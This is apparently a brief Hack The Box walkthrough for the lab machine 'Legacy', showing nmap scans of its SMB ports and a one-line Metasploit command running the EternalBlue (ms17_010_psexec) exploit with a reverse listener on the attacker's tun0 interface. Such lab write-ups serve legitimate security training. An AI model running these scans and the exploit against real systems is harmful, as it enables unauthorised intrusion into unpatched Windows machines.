# Legacy

# Introdution

[https://app.hackthebox.com/machines/Legacy](https://app.hackthebox.com/machines/Legacy)

This is a box Windows easy, where is possible to explore the vuln EternalBlue.

**Have a good time!**

## Diagram

```mermaid
graph TD
	Enumeration --> SMB --> Exploration --> |EternalBlue| A((ROOT))
```

# Enumeration

First step is to enumerate the box. For this we’ll use `nmap`.

```bash
ports=$(sudo nmap -p- -Pn --min-rate=1000 -T4 10.10.10.4 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) && sudo nmap -sC -sV -Pn -p $ports 10.10.10.4
```

![Untitled](Legacy%20a11c36b6798143eb80067800a38e1cbf/Untitled.png)

Two vulnerability was found related to **EternalBlue**.

```bash
sudo nmap -sS --script=vuln -p 135,139,445 10.10.10.4
```

![Untitled](Legacy%20a11c36b6798143eb80067800a38e1cbf/Untitled%201.png)

# Exploration

## **Exploring EternalBlue**

We’ll use one of metasploit exploits.

```bash
msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set rhosts 10.10.10.4; set lhost tun0; set lport 443; run"
```